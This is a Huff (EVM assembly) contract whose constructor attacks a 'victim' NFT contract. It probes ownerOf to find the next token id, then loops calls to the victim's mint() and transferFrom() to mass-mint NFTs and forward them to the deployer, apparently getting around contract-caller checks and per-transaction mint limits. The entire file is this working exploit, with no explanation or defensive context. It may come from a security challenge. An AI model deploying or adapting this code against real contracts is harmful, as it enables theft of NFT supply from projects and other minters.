#define macro IS_OWNED_LOOP() = takes(2) returns(2) {
    // Loop over ownerOf checks until it fails, giving us starting token id
    is_owned:
        // mstore start
        dup2 0x0c mstore                    // [victim, start]

        // ownerOf call
        calldatasize calldatasize 0x24 0x08 // [0x1c, 0x24, 0, 0, victim, start]
        dup5 gas staticcall                 // [success, victim, start]

        // Increment start
        dup3 add                            // [start + success, victim, start]
        dup1 swap3 lt                       // [success, victim, start + success]
    is_owned jumpi                          // [victim, start + success]
}

#define macro MINT_TRANSFER_LOOP() = takes(4) returns(4) {
    // Loop over mint and transfers
    next_iter:
        // mstore i
        dup1 0x48 mstore                    // [i, end, victim, success]

        // Mint
        calldatasize calldatasize 0x04 calldatasize calldatasize dup8
                                            // [victim, 0, 0, 0x04, 0, 0, i, end, victim, success]
        gas call                            // [success, i, end, victim, success]

        // Transfer
        calldatasize swap1 0x64 0x04 calldatasize dup8
                                            // [victim, 0, 0x04, 0x64, success, 0, i, end, victim, success]
        gas call                            // [success, i, end, victim, success]

        // Increment i
        add                                 // [i + 1, end, victim, success]

        // Get end > i + 1
        dup1 dup3 gt                        // [end > i + 1, i + 1, end, victim, success]
    next_iter jumpi                         // [i + 1, end, victim, success]
}

#define macro CONSTRUCTOR() = takes(0) returns(0) {
    // Starting iterator
    0x01                                    // [start]
    // Get victim address from end of bytecode
    0x20 dup1 codesize sub                  // [offset, size, start]
    returndatasize codecopy                 // [start]
    returndatasize mload                    // [victim, start]

    // mstore function selectors
    0x1249c58b23b872dd6352211e0000000000000000000000000000000000000000 returndatasize mstore  
                                            // [victim, start]

    IS_OWNED_LOOP()

    // mstore contract address
    address 0x08 mstore                     // [victim, start]

    // mstore caller address
    caller 0x28 mstore                      // [victim, start]

    // Get end
    dup2 0x95 add                           // [end, victim, start]

    // Initial mint
    calldatasize calldatasize 0x04 calldatasize calldatasize dup7    
                                            // [victim, 0, 0, 0x04, 0, 0, end, victim, start]
    gas call swap3                          // [start, end, victim, success]

    MINT_TRANSFER_LOOP()

    // mstore end
    0x48 mstore                             // [end, victim, success]

    // Transfer initial nft
    calldatasize calldatasize 0x64 0x04 calldatasize dup7
                                            // [victim, 0, 0x04, 0x64, 0, 0, victim, success]
    gas call                                // [success, victim, success]

    // Stop
    stop
}

#define macro MAIN() = takes (0) returns (0) {
}